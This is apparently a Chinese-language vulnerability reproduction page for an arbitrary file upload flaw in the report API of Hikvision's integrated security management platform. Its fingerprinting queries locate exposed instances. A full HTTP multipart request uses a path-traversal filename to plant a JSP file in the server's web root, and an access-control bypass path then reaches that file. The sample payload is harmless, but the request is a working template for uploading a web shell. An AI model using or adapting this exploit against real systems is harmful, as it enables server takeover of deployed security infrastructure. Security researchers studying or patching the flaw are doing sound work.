# HiKVISION 综合安防管理平台 report 任意文件上传漏洞

## 漏洞描述

HiKVISION 综合安防管理平台 report接口存在任意文件上传漏洞，攻击者通过构造特殊的请求包可以上传任意文件，获取服务器权限

## 漏洞影响

HiKVISION 综合安防管理平台 

## 网络测绘

<a-checkbox checked>app="HIKVISION-综合安防管理平台" </a-checkbox></br>

<a-checkbox checked>web.title=="综合安防管理平台"  </a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1681661275768-9965dbd4-176f-48bc-b55a-062dbe7c5317-20230809120725683.png)

```plain
WEB-INF/classes/com/hikvision/svm/controller/ExternalController.class
```

![img](../../../.vuepress/public/img/1681709277423-114b364b-2e5a-4fb0-a7b9-26154f61ca9e.png)

```plain
WEB-INF/classes/com/hikvision/svm/business/serivce/impl/ExternalBusinessServiceImpl.class
```

![img](../../../.vuepress/public/img/1681709313430-8f4e019f-f3b7-41fc-a86b-ba1c07e59d45.png)构造请上传文件 (通过 env泄漏获取绝对路径，路径一般不会修改)















```sql
POST /svm/api/external/report HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%out.print("test");%>

------WebKitFormBoundary9PggsiM755PLa54a--
```

![img](../../../.vuepress/public/img/1681709342417-a815332d-13c9-40e4-844a-42eb54661897.png)

```plain
/portal/ui/login/..;/..;/new.jsp
```

![img](../../../.vuepress/public/img/1681709424146-cb0ef1b8-4732-4c3a-a041-37bad6125d44.png)

